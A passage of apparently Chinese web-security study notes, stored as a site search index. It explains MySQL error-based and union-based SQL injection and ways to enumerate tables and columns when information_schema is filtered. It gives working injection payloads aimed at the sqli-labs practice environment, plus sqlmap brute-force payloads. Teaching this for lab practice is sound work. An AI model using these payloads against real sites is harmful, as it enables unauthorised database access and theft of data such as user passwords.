concat(database(),floor(rand(0)*2));</code></p> <ul> <li>floor(rand(0)*2) \u4ea7\u751f\u7684\u968f\u673a\u6570\u524d 6 \u4f4d\u4e00\u5b9a\u662f 0 1 1 0 1 1</li> <li>concat() \u7528\u4e8e\u5c06\u5b57\u7b26\u4e32\u8fde\u63a5</li> <li>concat(database(),floor(rand(0)*2)) \u751f\u6210 database()+\"0\" \u6216 database()+\"1\" \u7684\u6570\u5217\uff0c\u800c\u524d\u516d\u4f4d\u7684\u987a\u5e8f\u4e00\u5b9a\u662f<ul> <li>database()+\"0\"</li> <li>database()+\"1\"</li> <li>database()+\"1\"</li> <li>database()+\"0\"</li> <li>database()+\"1\"</li> <li>database()+\"1\"</li> </ul> </li> </ul> <p>\u62a5\u9519\u5177\u4f53\u8fc7\u7a0b\uff1a</p> <ul> <li>\u5efa\u7acb\u4e34\u65f6\u8868</li> <li>\u53d6\u7b2c\u4e00\u6761\u8bb0\u5f55\uff0c\u6267\u884c concat(database(),floor(rand(0)2))\uff08\u7b2c\u4e00\u6b21\u6267\u884c\uff09\uff0c\u7ed3\u679c\u4e3a database()+\u201c0\u201d\uff0c\u67e5\u8be2\u4e34\u65f6\u8868\uff0c\u53d1\u73b0 database()+\"0\" \u8fd9\u4e2a\u4e3b\u952e\u4e0d\u5b58\u5728\uff0c\u5219\u51c6\u5907\u6267\u884c\u63d2\u5165\uff0c\u6b64\u65f6\u53c8\u4f1a\u5728\u6267\u884c\u4e00\u6b21 concat(database(),floor(rand(0)2))\uff08\u7b2c\u4e8c\u6b21\u6267\u884c\uff09\uff0c\u7ed3\u679c\u662f database()+\u201c1\u201d\uff0c\u7136\u540e\u5c06\u8be5\u503c\u4f5c\u4e3a\u4e3b\u952e\u63d2\u5165\u5230\u4e34\u65f6\u8868\u3002*_\uff08\u771f\u6b63\u63d2\u5165\u5230\u4e34\u65f6\u8868\u4e2d\u7684\u4e3b\u952e\u662f database()+\u201c1\u201d\uff0cconcat(database(),floor(rand(0)_2)) \u6267\u884c\u4e86\u4e24\u6b21\uff09__</li> <li>\u53d6\u7b2c\u4e8c\u6761\u8bb0\u5f55\uff0c\u6267\u884c concat(database(),floor(rand(0)2))\uff08\u7b2c\u4e09\u6b21\u6267\u884c\uff09\uff0c\u7ed3\u679c\u4e3a database+\u201c1\u201d\uff0c\u67e5\u8be2\u4e34\u65f6\u8868\uff0c\u53d1\u73b0\u8be5\u4e3b\u952e\u5b58\u5728\uff0ccount() \u7684\u503c\u52a0 1</li> <li>\u53d6\u7b2c\u4e09\u6761\u8bb0\u5f55\uff0c\u6267\u884c concat(database(),floor(rand(0)2))\uff08\u7b2c\u56db\u6b21\u6267\u884c\uff09\uff0c\u7ed3\u679c\u4e3a database()+\u201c0\u201d\uff0c\u67e5\u8be2\u4e34\u65f6\u8868\u53d1\u73b0\u8be5\u4e3b\u952e\u4e0d\u5b58\u5728\uff0c\u5219\u51c6\u5907\u6267\u884c\u63d2\u5165\u52a8\u4f5c\uff0c\u6b64\u65f6\u53c8\u4f1a\u5728\u6267\u884c\u4e00\u6b21 concat(database(),floor(rand(0)2))\uff08\u7b2c\u4e94\u6b21\u6267\u884c\uff09\uff0c\u7ed3\u679c\u662f database()+\u201c1\u201d\uff0c\u7136\u540e\u5c06\u8be5\u503c\u4f5c\u4e3a\u4e3b\u952e\u63d2\u5165\u5230\u4e34\u65f6\u8868\u3002\u4f46\u7531\u4e8e\u4e34\u65f6\u8868\u5df2\u7ecf\u5b58\u5728 database()+\"1\" \u8fd9\u4e2a\u4e3b\u952e\uff0c\u5c31\u4f1a\u7206\u51fa\u4e3b\u952e\u91cd\u590d\uff0c\u540c\u65f6\u4e5f\u5e26\u51fa\u4e86\u6570\u636e\u5e93\u540d\uff0c\u8fd9\u5c31\u662f group by \u62a5\u9519\u6ce8\u5165\u7684\u539f\u7406</li> </ul> <p>\u7531\u4ee5\u4e0a\u8fc7\u7a0b\u53ef\u4ee5\u53d1\u73b0\uff0c\u603b\u5171\u53d6\u4e86\u4e09\u6761\u8bb0\u5f55\uff0c\u6240\u4ee5\u8868\u4e2d\u7684\u6570\u636e\u81f3\u5c11\u8981\u4e3a\u4e09\u6761\u624d\u53ef\u4ee5\u6ce8\u5165\u6210\u529f\uff01\uff01\uff01</p>"},{"location":"WEB/others/information_schema/","title":"Information schema","text":""},{"location":"WEB/others/information_schema/#information_schema","title":"information_schema","text":"<p>\u5728MySQL\u4e2d\uff0c\u628a information_schema \u770b\u4f5c\u662f\u4e00\u4e2a\u6570\u636e\u5e93\uff0c\u786e\u5207\u8bf4\u662f\u4fe1\u606f\u6570\u636e\u5e93\u3002\u5176\u4e2d\u4fdd\u5b58\u7740\u5173\u4e8eMySQL\u670d\u52a1\u5668\u6240\u7ef4\u62a4\u7684\u6240\u6709\u5176\u4ed6\u6570\u636e\u5e93\u7684\u4fe1\u606f\u3002\u5982\u6570\u636e\u5e93\u540d\uff0c\u6570\u636e\u5e93\u7684\u8868\uff0c\u8868\u680f\u7684\u6570\u636e\u7c7b\u578b\u4e0e\u8bbf\u95ee\u6743 \u9650\u7b49\u3002</p> <p>\u5728INFORMATION_SCHEMA\u4e2d\uff0c\u6709\u6570\u4e2a\u53ea\u8bfb\u8868\u3002\u5b83\u4eec\u5b9e\u9645\u4e0a\u662f\u89c6\u56fe\uff0c\u800c\u4e0d\u662f\u57fa\u672c\u8868\uff0c\u56e0\u6b64\uff0c\u4f60\u5c06\u65e0\u6cd5\u770b\u5230\u4e0e\u4e4b\u76f8\u5173\u7684\u4efb\u4f55\u6587\u4ef6\u3002</p> <p>MySQL 5.0 \u4e4b\u524d\u7684\u7248\u672c\u662f\u6ca1\u6709 <code>information_schema</code> \u6570\u636e\u5e93\u7684\u3002\u8fd9\u4e2a\u6570\u636e\u5e93\u662f\u5728 MySQL 5.0 \u7248\u672c\u4e4b\u540e\u5f15\u5165\u7684\u3002\u5728 MySQL 5.0 \u4e4b\u524d\uff0cMySQL \u4f7f\u7528\u7684\u662f <code>mysql</code> \u6570\u636e\u5e93\u6765\u5b58\u50a8\u7cfb\u7edf\u5143\u6570\u636e\u4fe1\u606f\u3002</p>"},{"location":"WEB/others/information_schema/#information_schema_1","title":"information_schema\u6570\u636e\u5e93\u8868\u8bf4\u660e:","text":"\u8868\u540d\u79f0 \u4f5c\u7528 SCHEMATA\u8868 \u63d0\u4f9b\u4e86\u5f53\u524dmysql\u5b9e\u4f8b\u4e2d\u6240\u6709\u6570\u636e\u5e93\u7684\u4fe1\u606f\u3002\u662fshow databases\u7684\u7ed3\u679c\u53d6\u4e4b\u6b64\u8868\u3002 TABLES\u8868 \u63d0\u4f9b\u4e86\u5173\u4e8e\u6570\u636e\u5e93\u4e2d\u7684\u8868\u7684\u4fe1\u606f\uff08\u5305\u62ec\u89c6\u56fe\uff09\u3002\u8be6\u7ec6\u8868\u8ff0\u4e86\u67d0\u4e2a\u8868\u5c5e\u4e8e\u54ea\u4e2aschema\uff0c\u8868\u7c7b\u578b\uff0c\u8868\u5f15\u64ce\uff0c\u521b\u5efa\u65f6\u95f4\u7b49\u4fe1\u606f\u3002\u662fshow tables from schemaname\u7684\u7ed3\u679c\u53d6\u4e4b\u6b64\u8868\u3002 COLUMNS\u8868 \u63d0\u4f9b\u4e86\u8868\u4e2d\u7684\u5217\u4fe1\u606f\u3002\u8be6\u7ec6\u8868\u8ff0\u4e86\u67d0\u5f20\u8868\u7684\u6240\u6709\u5217\u4ee5\u53ca\u6bcf\u4e2a\u5217\u7684\u4fe1\u606f\u3002\u662fshow columns from schemaname.tablename\u7684\u7ed3\u679c\u53d6\u4e4b\u6b64\u8868\u3002 STATISTICS\u8868 \u63d0\u4f9b\u4e86\u5173\u4e8e\u8868\u7d22\u5f15\u7684\u4fe1\u606f\u3002\u662fshow index from schemaname.tablename\u7684\u7ed3\u679c\u53d6\u4e4b\u6b64\u8868\u3002 USER_PRIVILEGES\uff08\u7528\u6237\u6743\u9650\uff09\u8868 \u7ed9\u51fa\u4e86\u5173\u4e8e\u5168\u7a0b\u6743\u9650\u7684\u4fe1\u606f\u3002\u8be5\u4fe1\u606f\u6e90\u81eamysql.user\u6388\u6743\u8868\u3002\u662f\u975e\u6807\u51c6\u8868\u3002 SCHEMA_PRIVILEGES\uff08\u65b9\u6848\u6743\u9650\uff09\u8868 \u7ed9\u51fa\u4e86\u5173\u4e8e\u65b9\u6848\uff08\u6570\u636e\u5e93\uff09\u6743\u9650\u7684\u4fe1\u606f\u3002\u8be5\u4fe1\u606f\u6765\u81eamysql.db\u6388\u6743\u8868\u3002\u662f\u975e\u6807\u51c6\u8868\u3002 TABLE_PRIVILEGES\uff08\u8868\u6743\u9650\uff09\u8868 \u7ed9\u51fa\u4e86\u5173\u4e8e\u8868\u6743\u9650\u7684\u4fe1\u606f\u3002\u8be5\u4fe1\u606f\u6e90\u81eamysql.tables_priv\u6388\u6743\u8868\u3002\u662f\u975e\u6807\u51c6\u8868\u3002 COLUMN_PRIVILEGES\uff08\u5217\u6743\u9650\uff09\u8868 \u7ed9\u51fa\u4e86\u5173\u4e8e\u5217\u6743\u9650\u7684\u4fe1\u606f\u3002\u8be5\u4fe1\u606f\u6e90\u81eamysql.columns_priv\u6388\u6743\u8868\u3002\u662f\u975e\u6807\u51c6\u8868\u3002 CHARACTER_SETS\uff08\u5b57\u7b26\u96c6\uff09\u8868 \u63d0\u4f9b\u4e86mysql\u5b9e\u4f8b\u53ef\u7528\u5b57\u7b26\u96c6\u7684\u4fe1\u606f\u3002\u662fSHOW CHARACTER SET\u7ed3\u679c\u96c6\u53d6\u4e4b\u6b64\u8868\u3002 COLLATIONS\u8868 \u63d0\u4f9b\u4e86\u5173\u4e8e\u5404\u5b57\u7b26\u96c6\u7684\u5bf9\u7167\u4fe1\u606f\u3002 COLLATION_CHARACTER_SET_APPLICABILITY\u8868 \u6307\u660e\u4e86\u53ef\u7528\u4e8e\u6821\u5bf9\u7684\u5b57\u7b26\u96c6\u3002\u8fd9\u4e9b\u5217\u7b49\u6548\u4e8eSHOW COLLATION\u7684\u524d\u4e24\u4e2a\u663e\u793a\u5b57\u6bb5\u3002 TABLE_CONSTRAINTS\u8868 \u63cf\u8ff0\u4e86\u5b58\u5728\u7ea6\u675f\u7684\u8868\u3002\u4ee5\u53ca\u8868\u7684\u7ea6\u675f\u7c7b\u578b\u3002 KEY_COLUMN_USAGE\u8868 \u63cf\u8ff0\u4e86\u5177\u6709\u7ea6\u675f\u7684\u952e\u5217\u3002 ROUTINES\u8868 \u63d0\u4f9b\u4e86\u5173\u4e8e\u5b58\u50a8\u5b50\u7a0b\u5e8f\uff08\u5b58\u50a8\u7a0b\u5e8f\u548c\u51fd\u6570\uff09\u7684\u4fe1\u606f\u3002\u6b64\u65f6\uff0cROUTINES\u8868\u4e0d\u5305\u542b\u81ea\u5b9a\u4e49\u51fd\u6570\uff08UDF\uff09\u3002\u540d\u4e3a\u201cmysql.proc name\u201d\u7684\u5217\u6307\u660e\u4e86\u5bf9\u5e94\u4e8eINFORMATION_SCHEMA.ROUTINES\u8868\u7684mysql.proc\u8868\u5217\u3002 VIEWS\u8868 \u7ed9\u51fa\u4e86\u5173\u4e8e\u6570\u636e\u5e93\u4e2d\u7684\u89c6\u56fe\u7684\u4fe1\u606f\u3002\u9700\u8981\u6709show views\u6743\u9650\uff0c\u5426\u5219\u65e0\u6cd5\u67e5\u770b\u89c6\u56fe\u4fe1\u606f\u3002 TRIGGERS\u8868 \u63d0\u4f9b\u4e86\u5173\u4e8e\u89e6\u53d1\u7a0b\u5e8f\u7684\u4fe1\u606f\u3002\u5fc5\u987b\u6709super\u6743\u9650\u624d\u80fd\u67e5\u770b\u8be5\u8868 <p>\u539f\u6587\u94fe\u63a5\uff1ahttps://blog.csdn.net/xianjie0318/article/details/80857568</p>"},{"location":"WEB/others/information_schema/#other","title":"other:","text":"<p>\u67e5\u770btables\u7684\u8868\u7ed3\u6784 <code>desc tables;</code></p> <p>\u67e5\u770btables\u6709\u591a\u5c11\u6761\u6570\u636e<code>select count(*) from tables;</code></p> <p>select * from table limit 3, 7; // \u8fd4\u56de4-11\u884c</p> <p>select * from table limit 3,1; // \u8fd4\u56de\u7b2c4\u884c</p> <p>select * from table limit 3; // \u8fd4\u56de\u524d3\u884c</p>"},{"location":"WEB/others/information_schema/#information_schema_2","title":"\u7ed5\u8fc7 information_schema","text":"<p>\u9650\u5236\u6761\u4ef6\uff1a</p> <ol> <li> <p>\u6570\u636e\u5e93\u7248\u672c\u8981\u5927\u4e8e5.7</p> </li> <li> <p>\u6743\u9650\u95ee\u9898\uff1a\u8981\u6c42\u6743\u9650\u9ad8\uff0croot\u7528\u6237\u624d\u80fd\u591f\u8bbf\u95ee</p> </li> </ol> <p>\u200b       \u7531\u4e8e<code>performance_schema</code>\u8fc7\u4e8e\u590d\u6742\uff0c\u6240\u4ee5mysql\u57285.7\u7248\u672c\u4e2d\u65b0\u589e\u4e86<code>sys schemma</code>\uff0c\u57fa\u7840\u6570\u636e\u6765\u81ea\u4e8e<code>performance_chema</code>\u548c<code>information_schema</code>\u4e24\u4e2a\u5e93\uff0c\u672c\u8eab\u6570\u636e\u5e93\u4e0d\u5b58\u50a8\u6570\u636e\u3002</p> Markdown<pre><code>*\u6ce8*\uff1a \n    \u8fd9\u91cc\u8bf4\u4e00\u4e0b\uff0c\u73b0\u5728\u7f51\u7edc\u4e0a\u80fd\u641c\u7d22\u5230\u7684\u6587\u7ae0\u5927\u90e8\u5206\u90fd\u662f\u5229\u7528innoDB\u5f15\u64ce\u7ed5\u8fc7\u5bf9information_schema\u7684\u8fc7\u6ee4\uff0c\u4f46\u662fmysql\u9ed8\u8ba4\u662f\u5173\u95edInnoDB\u5b58\u50a8\u5f15\u64ce\u7684\uff0c\u6240\u4ee5\u5728\u672c\u6587\u4e2d\u4e0d\u8ba8\u8bba\u8be5\u65b9\u6cd5\uff0c\u82e5\u60f3\u4e86\u89e3\u53ef\u81ea\u884c\u641c\u7d22\uff0c\u7f51\u7edc\u4e0a\u6709\u5f88\u591a\u5206\u6790\u6587\u7ae0\u4e86\u3002\n</code></pre>"},{"location":"WEB/others/information_schema/#sysschema_auto_increment_columns","title":"sys.schema_auto_increment_columns","text":"<p>\u200b       \u8be5\u89c6\u56fe\u7684\u4f5c\u7528\u7b80\u5355\u6765\u8bf4\u5c31\u662f\u7528\u6765\u5bf9\u8868\u81ea\u589eID\u7684\u76d1\u63a7\u3002</p> <p>\u200b       \u5f00\u59cb\u4e86\u89e3\u8fd9\u4e2a\u89c6\u56fe\u4e4b\u524d\uff0c\u5e0c\u671b\u4f60\u53ef\u4ee5\u60f3\u4e00\u4e0b\u5f53\u4f60\u5229\u7528Mysql\u8bbe\u8ba1\u6570\u636e\u5e93\u65f6\uff0c\u662f\u5426\u4f1a\u7ed9\u6bcf\u4e2a\u8868\u52a0\u4e00\u4e2a\u81ea\u589e\u7684id\uff08\u6216\u5176\u4ed6\u540d\u5b57\uff09\u5b57\u6bb5\u5462\uff1f\u5982\u679c\u662f\uff0c\u90a3\u4e48\u6211\u4eec\u53d1\u73b0\u4e86\u4e00\u4e2a\u6ce8\u5165\u4e2d\u5728mysql\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u5c31\u53ef\u4ee5\u66ff\u4ee3information_schema\u5e93\u7684\u65b9\u6cd5\u3002</p> <p>\u200b       \u5982\u679c\u6211\u4eec\u5728\u8bbe\u8ba1mysql\u6570\u636e\u5e93\u7684\u65f6\u5019\u8bbe\u8ba1\u4e00\u4e2a\u968f\u7740\u7528\u6237\u589e\u52a0\u800c\u81ea\u589e\u7684\u5b57\u6bb5\uff0c\u4f8b\u5982id\uff0c\u90a3\u4e48\u5728\u8fdb\u884csql\u6ce8\u5165\u65f6\u6211\u4eec\u5c31\u80fd\u627e\u5230\u4ee3\u66ffinformation_schema\u5e93\u7684\u65b9\u6cd5\uff0c\u8fd9\u6837\u8bf4\u6765\u5e94\u8be5\u5c31\u5f88\u5bb9\u6613\u660e\u767d\u4e86\uff0cschema_auto_increment_columns\u8fd9\u4e2a\u6a21\u5757\u7684\u4f5c\u7528\u5c31\u662f\u7528\u6765\u5bf9\u8868\u81ea\u589eid\u7684\u76d1\u63a7\u3002</p> <p>\u200b       \u7f3a\u70b9\uff1a\u65e0\u6cd5\u901a\u8fc7\u6ce8\u5165\u83b7\u53d6\u5230\u6ca1\u6709\u81ea\u589e\u4e3b\u952e\u7684\u8868\u7684\u6570\u636e</p> <p>\u200b       \u4ee5\u4e0b\u73af\u5883\u4e3asqli-labs\uff0c\u53ef\u81ea\u884c\u6d4b\u8bd5</p> JavaScript<pre><code>-1' union select 1,(select group_concat(table_name) from sys.schema_auto_increment_columns where table_schema=database()),3 --+\n</code></pre>"},{"location":"WEB/others/information_schema/#sysschema_table_statistics_with_buffer-sysxschema_table_statistics_with_buffer","title":"sys.schema_table_statistics_with_buffer sys.x$schema_table_statistics_with_buffer","text":"<p>\u200b        \u8fd9\u4e2a\u521a\u597d\u80fd\u591f\u8865\u5145\u4e0a\u9762\u89c6\u56fe\u7684\u4e0d\u8db3\uff0c\u4e5f\u5c31\u662f\u518d\u8bf4\uff0c\u5982\u679c\u6211\u4eec\u5728\u8bbe\u5b9amysql\u73af\u5883\u65f6\u6ca1\u6709\u8bbe\u7f6e\u81ea\u589e\u7684\u5b57\u6bb5\u65f6\uff0c\u5c31\u53ef\u4ee5\u5229\u7528\u8be5\u8bd5\u56fe\u6765\u83b7\u53d6\u4fe1\u606f\u3002</p> JavaScript<pre><code>?id = -1' union select 1,(select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema=database()),3 --+\n</code></pre> <p>\u200b       \u67e5\u8be2\u8868\u7684\u7edf\u8ba1\u4fe1\u606f\uff0c\u5176\u4e2d\u8fd8\u5305\u62ecInnoDB\u7f13\u51b2\u6c60\u7edf\u8ba1\u4fe1\u606f\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u6309\u7167\u589e\u5220\u6539\u67e5\u64cd\u4f5c\u7684\u603b\u8868I/O\u5ef6\u8fdf\u65f6\u95f4\uff08\u6267\u884c\u65f6\u95f4\uff0c\u5373\u4e5f\u53ef\u4ee5\u7406\u89e3\u4e3a\u662f\u5b58\u5728\u6700\u591a\u8868I/O\u4e89\u7528\u7684\u8868\uff09\u964d\u5e8f\u6392\u5e8f\uff0c\u6570\u636e\u6765\u6e90\uff1a</p> <p><code>performance_schema.table_io_waits_summary_by_table</code> <code>sys.x$ps_schema_table_statistics_io</code> <code>sys.x$innodb_buffer_stats_by_table</code></p> <p>\u7c7b\u4f3c\u7684\u8868\u8fd8\u6709 mysql.innodb_table_stats\u3001mysql_innodb_table_index\u90fd\u5b58\u653e\u6709\u5e93\u540d\u548c\u8868\u540d</p> <p>\u8fd9\u4fe9\u8868\u5bf9\u6743\u9650\u7684\u8981\u6c42\u76f8\u5bf9\u8f83\u5c0f</p> <p>\u5728mysql\u7cfb\u7edf\u5e93\u4e5f\u6709\u4e24\u4e2a\u8868\u4e2d\u5305\u542b\u90e8\u5206\u8868\u540d innodb_index_stats innodb_table_stats</p> <p>\u200b       \u4e0a\u9762\u7684\u65b9\u6cd5\u7684\u786e\u53ef\u4ee5\u83b7\u53d6\u6570\u636e\u5e93\u4e2d\u8868\u540d\u4fe1\u606f\u4e86\uff0c\u4f46\u662f\u5e76\u6ca1\u6709\u627e\u5230\u7c7b\u4f3c\u4e8einformation_schema\u4e2dCOLUMNS\u7684\u89c6\u56fe\uff0c\u4e5f\u5c31\u662f\u8bf4\u6211\u4eec\u5e76\u4e0d\u80fd\u83b7\u53d6\u6570\u636e\uff1f</p> <p>\u200b       \u63a5\u4e0b\u6765\u770b\u770b\u65e0\u5217\u540d\u6ce8\u5165\u5427\u3002</p>"},{"location":"WEB/others/information_schema/#_1","title":"\u65e0\u5217\u540d\u6ce8\u5165","text":"<p>\u200b       \u5229\u7528<code>join \u2026 using(xx)</code>\u6ce8\u5217\u540d</p> <p>\u200b       \u901a\u8fc7\u7cfb\u7edf\u5173\u952e\u8bcd<code>join</code>\u53ef\u5efa\u7acb\u4e24\u4e2a\u8868\u4e4b\u95f4\u7684\u5185\u8fde\u63a5\u3002\u901a\u8fc7\u5bf9\u60f3\u8981\u67e5\u8be2\u5217\u540d\u6240\u5728\u7684\u8868\u4e0e\u5176\u81ea\u8eab\u5185\u8fde\u63a5\uff0c\u4f1a\u7531\u4e8e\u5197\u4f59\u7684\u539f\u56e0(\u76f8\u540c\u5217\u540d\u5b58\u5728)\uff0c\u800c\u53d1\u751f\u9519\u8bef\u3002\u5e76\u4e14\u62a5\u9519\u4fe1\u606f\u4f1a\u5b58\u5728\u91cd\u590d\u7684\u5217\u540d\uff0c\u53ef\u4ee5\u4f7f\u7528 USING \u8868\u8fbe\u5f0f\u58f0\u660e\u5185\u8fde\u63a5\uff08INNER JOIN\uff09\u6761\u4ef6\u6765\u907f\u514d\u62a5\u9519</p> <p>\u200b       \u5f53information_schema\u88abWAF\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u5728\u77e5\u9053\u4e86\u8868\u540d\u540e\u901a\u8fc7\u65e0\u5217\u540d\u6ce8\u5165\u6280\u5de7\u83b7\u53d6\u5b57\u6bb5\u503c</p> <p>\u5982\u4e0b\uff0c\u4f7f\u7528sql\u8bed\u53e5 <code>select 1\uff0c2\uff0c3 union select * from \u8868\u540d</code></p> Text Only<pre><code># schema_auto_increment_columns\n\n?id=-1' union all select 1,2,group_concat(table_name)from sys.schema_auto_increment_columns where table_schema=database()--+\n</code></pre> Text Only<pre><code># schema_table_statistics_with_buffer\n\n?id=-1' union all select 1,2,group_concat(table_name)from sys.schema_table_statistics_with_buffer where table_schema=database()--+\n</code></pre> Text Only<pre><code># \u83b7\u53d6\u7b2c\u4e00\u5217\u7684\u5217\u540d\n\n?id=-1' union all select*from (select * from users as a join users b)c--+\n</code></pre> Text Only<pre><code># \u83b7\u53d6\u6b21\u5217\u53ca\u540e\u7eed\u5217\u540d\n\n?id=-1' union all select*from (select * from users as a join users b using(id,username))c--+\n</code></pre> <p>==\u6ce8\u610f1\uff1a==\u4f7f\u7528\u5b50\u67e5\u8be2\u7684\u65f6\u5019\uff0c\u5373\u4e00\u4e2a\u67e5\u8be2\u5d4c\u5957\u5728\u53e6\u4e00\u4e2a\u67e5\u8be2\u4e2d\uff0c\u5185\u5c42\u67e5\u8be2\u7684\u7ed3\u679c\u53ef\u4ee5\u4f5c\u4e3a\u5916\u5c42\u67e5\u8be2\u7684\u6761\u4ef6\uff0c\u5185\u5c42\u67e5\u8be2\u5230\u7684\u7ed3\u679c\u9700\u8981\u8d77\u4e00\u4e2a\u522b\u540d(as)</p> <p>==\u6ce8\u610f2\uff1a==\u8981\u67e5\u8be2\u7684\u5217\u9700\u8981\u7528\uff08\u53cd\u5f15\u53f7\uff09\u6765\u5305\u88f9\u3002</p> Text Only<pre><code>SELECT`2`FROM (SELECT 1,2,3 UNION SELECT * FROM users)as X\n</code></pre> <p>\u5982\u679c\u53cd\u5f15\u53f7``\u88ab\u8fc7\u6ee4\uff0c\u6211\u4eec\u53ef\u4ee5\u91c7\u7528\u53d6\u522b\u540d\u7684\u65b9\u6cd5\u6765\u67e5\u8be2</p> Text Only<pre><code>SELECT a FROM (SELECT 1,2 as a,3 union select * from users)as x\n</code></pre> <p>\u793a\u4f8b\uff1a</p> <p><code>select 1,2,3,4,5 union select * from users;</code> \u65e0\u5217\u540d\u6ce8\u5165\u5173\u952e \u5c31\u662f\u8981\u731c\u6d4b\u8868\u91cc\u6709\u591a\u5c11\u4e2a\u5217\uff0c\u8981\u4e00\u4e00\u5bf9\u5e94\u4e0a\uff0c\u4e0a\u9762\u4f8b\u5b50\u662f\u67095\u4e2a\u5217 1\uff0c2\uff0c3\uff0c4\uff0c5 \u7684\u4f5c\u7528\u5c31\u662f\u5bf9\u5217\u8d77\u522b\u540d\uff0c\u66ff\u6362\u4e3a\u540e\u9762\u65e0\u5217\u540d\u6ce8\u5165\u505a\u51c6\u5907</p> <p>\u6b63\u5e38\u67e5\u8be2\uff1a </p> <p>\u65e0\u5217\u540d\u67e5\u8be2\uff1a </p> <p>\u63a5\u7740\u5c31\u53ef\u4ee5\u4f7f\u7528\u6570\u5b57\u6765\u5bf9\u5e94\u5217\u8fdb\u884c\u67e5\u8be2\uff0c\u59823\u5bf9\u5e94\u4e86\u8868\u91cc\u9762\u7684pass</p> Text Only<pre><code>select `3` from (select 1,2,3,4,5 union select * from users)as a;\n</code></pre> <p>\u5c31\u76f8\u5f53\u4e8e<code>select pass from (select 1,2,3,4,5 union select * from users)as a;</code> SQL \u4e2d\u53cd\u5f15\u53f7\u662f\u53ef\u4ee5\u4ee3\u8868\u6570\u636e\u5e93\u540d\u548c\u5217\u540d\u7684 (select 1,2,3,4,5 union select * from users)as a \u628a\u62ec\u53f7\u91cc\u7684\u67e5\u8be2\u6570\u636e\u91cd\u547d\u540d\u4e00\u5f20\u65b0\u7684\u8868 a\uff0c\u5728\u4ece\u4e2d\u67e5\u8be2</p> <p></p> <p>\u5f53\u53cd\u5f15\u53f7\u88ab\u7981\u7528\u65f6\uff0c\u5c31\u53ef\u4ee5\u4f7f\u7528\u8d77\u522b\u540d\u7684\u65b9\u6cd5\u6765\u4ee3\u66ff <code>select b from (select 1,2, 3 as b ,4,5 union select * from users)as a;</code> \u5728\u6ce8\u5165\u65f6\u540c\u65f6\u67e5\u8be2\u591a\u4e2a\u5217 <code>select group_concat(b,c) from (select 1,2, 3 as b , 4 as c ,5 union select * from users)as a;</code></p> <p></p>"},{"location":"WEB/others/information_schema/#sqlmap","title":"sqlmap\u7684\u5904\u7406","text":"<p>sqlmap\u63d0\u4f9b\u4e86\u66b4\u529b\u7834\u89e3\u8868\u540d\u7684\u7684\u9009\u9879<code>--common-tables</code>\uff0c\u5f53\u51fa\u73b0\u4ee5\u4e0b\u573a\u666f\u7684\u65f6\u5019\u3002</p> <ol> <li> <p>DBMS\uff08Database Management System\uff0c\u6570\u636e\u5e93\u7ba1\u7406\u7cfb\u7edf\uff09\u662f &lt; 5.0 \u7248\u672c\u7684 MySQL\uff0c\u5b83\u4eec\u4e0d\u5177\u5907 information_schema\u3002</p> </li> <li> <p>DBMS \u662f\u5fae\u8f6f\u7684 Access \u6570\u636e\u5e93\uff0c\u5e76\u4e14\u5176\u4e2d\u7684\u7cfb\u7edf\u8868 MSysObjects \u9ed8\u8ba4\u8bbe\u7f6e\u4e0d\u53ef\u8bfb\u3002</p> </li> <li> <p>\u5f53\u524d\u4f1a\u8bdd\u7528\u6237\u5bf9 DBMS \u4e2d\u5b58\u50a8\u6570\u636e\u8868\u5b9a\u4e49\u7684\u7cfb\u7edf\u8868\u6ca1\u6709\u8bfb\u6743\u9650\u3002</p> </li> </ol> <p>\u5c31\u4f1a\u91c7\u7528\u5b57\u5178\u4e2d\u7684\u8868\u540d\u8fdb\u884c\u66b4\u529b\u7834\u89e3\uff0c\u8868\u540d\u50a8\u5b58\u5728sqlmap\u8def\u5f84\\data\\txt\u4e2d</p> <p>\u7206\u7834\u65f6\u53d1\u9001\u7684payload</p> Text Only<pre><code>1' AND EXISTS(SELECT 2 FROM security.users) AND 'WKMd'='WKMd\n1' AND EXISTS(SELECT 9 FROM security.customer) AND 'hQcB'='hQcB\n1' AND EXISTS(SELECT 8 FROM security.`user`) AND 'ckZb'='ckZb\n1' AND EXISTS(SELECT 1 FROM security.orders) AND 'WffN'='WffN\n1' AND EXISTS(SELECT 3 FROM security.employee) AND 'KfTF'='KfTF\n1' AND EXISTS(SELECT 1 FROM security.x_world) AND 'uuGu'='uuGu\n1' AND EXISTS(SELECT 8 FROM security.category) AND 'tHIj'='tHIj\n1' AND EXISTS(SELECT 8 FROM security.project) AND 'HBCY'='HBCY\n1' AND EXISTS(SELECT 7 FROM security.account) AND 'tSOY'='tSOY\n1' AND EXISTS(SELECT 4 FROM security.customers) AND 'HlJM'='HlJM\n1' AND EXISTS(SELECT 9 FROM security.country) AND 'gEzc'='gEzc\n1' AND EXISTS(SELECT 1 FROM security.config) AND 'hQdH'='hQdH\n</code></pre> <p>\u5b98\u65b9\u6587\u6863\u4e2d\u8bf4\uff0c\u5f00\u542f\u4e86\u7206\u7834\u540e\uff0csqlmap \u4ecd\u7136\u53ef\u4ee5\u8bc6\u522b\u51fa\u90e8\u5206\u7cfb\u7edf\u6570\u636e\u8868\u3002\u4e0d\u8fc7\u4ece\u62e6\u622a\u7684\u60c5\u51b5\u6765\u770b\u597d\u50cf\u5e76\u6ca1\u6709\u5c1d\u8bd5\u901a\u8fc7sys\u4e2d\u7684\u89c6\u56fe\u4ee5\u53camysql\u5e93\u4e2d\u7684\u7cfb\u7edf\u8868\u6765\u83b7\u5f97\u6570\u636e\u3002</p>"},{"location":"WEB/others/information_schema/#_2","title":"\u5176\u4ed6\u53ef\u7528\u8868","text":"<p>\u539f\u6587\uff1aMYSQL\u6ce8\u5165\u4e2d information_schema \u7684\u66ff\u4ee3</p> <p>Mysql \u7248\u672c: 5.7.26</p> <p>\u5148\u7f57\u5217\u4e00\u4e0b\u53ef\u7528\u8868\uff1a</p> Text 